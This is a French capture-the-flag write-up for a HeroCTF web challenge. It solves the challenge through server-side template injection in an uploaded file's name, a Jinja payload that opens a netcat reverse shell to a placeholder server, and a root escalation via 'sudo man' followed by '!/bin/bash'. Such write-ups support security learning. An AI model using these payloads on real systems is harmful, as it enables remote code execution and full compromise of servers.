# The Last One

### Catégorie

Web

### Description

Un de vos camarades à mis en place une plateforme d'upload pour vérifier vos devoirs..
Bizarrement, ses notes ont largement augmentées depuis qu'il l'a mis en place..

Prenez la main sur son serveur en lisant le fichier /flag.txt !

Accès au challenge

Rappel : Le bruteforce n'est pas autorisé

Format : Hero{flag}

### Auteur 

Worty

### Solution

Quand on arrive sur la page, on nous propose juste d'upload un fichier rien de plus.<br/>
Le serveur nous répond simple : "Your file test.docx will be review soon, thanks!"

Si l'on intercepte les headers, on remarque ceci lorsque le serveur répond : "Server: Werkzeug/1.0.1 Python/3.5.2"<br/>
Le serveur étant en python, on pense directement à une faille de type Server Side Template Injection, mais ou??<br/>
La réponse est simple, dans le nom du fichier !

Interceptons cette fois-ci la requête avec burp suite pour directement modifier le nom du fichier en {{7*7}}<br/>
Le serveur nous répond : "Your file 49 will be review soon, thanks!", il est donc vulnérable.

Je vous épargne la recherche de la classe subprocess.Popen qui est longue et fastidieuse, au final, la payload pour exécuter du code est :<br/>
{{().__class__.__mro__[1].__subclasses__()[94]('nc <YOUR_SERVER> <PORT> -e /bin/bash',shell=True,stdout=-1).communicate()}}<br/>
Super, allons lire le fichier /flag.txt! Et là, c'est le drame, le fichier est owned par root et nous n'avons pas les droits de lecture..

Executons la commande "sudo -l" pour voir quelle potentielle commande nous aurons le droit d'exécuter sans mot de passe, bim, la commande man peut etre lancée en tant que root sans mot de passe!<br/>
Payload : sudo -u root man man

Une fois dans le man, on entre simplement !/bin/bash, et nous obtenons un shell root!

### Flag

Hero{th4nk_y0u_f0r_play1ng_HeroCTF_!!}